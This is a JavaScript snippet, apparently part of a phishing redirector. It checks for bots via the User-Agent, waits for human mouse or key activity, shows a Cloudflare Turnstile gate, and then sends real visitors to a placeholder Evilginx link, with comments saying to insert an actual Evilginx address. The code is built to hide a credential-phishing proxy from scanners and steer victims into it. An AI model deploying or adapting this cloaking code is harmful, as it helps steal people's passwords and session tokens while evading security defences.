        // Function to check if the User-Agent is a bot
        function isBot(userAgent) {
            return botUserAgents.some(bot => userAgent.includes(bot));
        }

        // Function to check if the user has interacted with the page
        let userInteracted = false;
        document.onmousemove = document.onkeypress = function() {
            userInteracted = true;
        };

        // Function to add Cloudflare Turnstile CAPTCHA before redirecting
        function addTurnstileCaptcha() {
            // Create Turnstile widget container
            const captchaDiv = document.createElement("div");
            captchaDiv.className = "cf-turnstile";
            captchaDiv.setAttribute("0x4AAAAAAAiGv_80l5_ZajLl", "0x4AAAAAAAiGvw59L_v2VlclGpyKUIalcoo"); // Replace with your actual site key
            document.body.appendChild(captchaDiv);

            // Load Turnstile script
            const script = document.createElement("script");
            script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js";
            script.async = true;
            script.defer = true;
            document.head.appendChild(script);

            // Add a submit button
            const submitButton = document.createElement("button");
            submitButton.innerHTML = "Submit";
            submitButton.onclick = function() {
                // Here you might need to verify the Turnstile token server-side before redirecting
                window.location.href = "https://yourevilginxlink.com"; // Replace with your actual Evilginx link
            };
            document.body.appendChild(submitButton);
        }

        // Main logic for redirect
        setTimeout(function() {
            if (!isBot(navigator.userAgent) && userInteracted) {
                // User is not a bot and has interacted with the page
                window.location.href = "https://yourevilginxlink.com"; // Replace with your actual Evilginx link
            } else if (!userInteracted) {
                // User hasn't interacted, add CAPTCHA to ensure it's a human
                addTurnstileCaptcha();
            } else {
                // Bot detected or no interaction
                document.write("Access Denied");
            }
        }, Math.floor(Math.random() * 2000) + 1000); // Random delay between 1-3 seconds
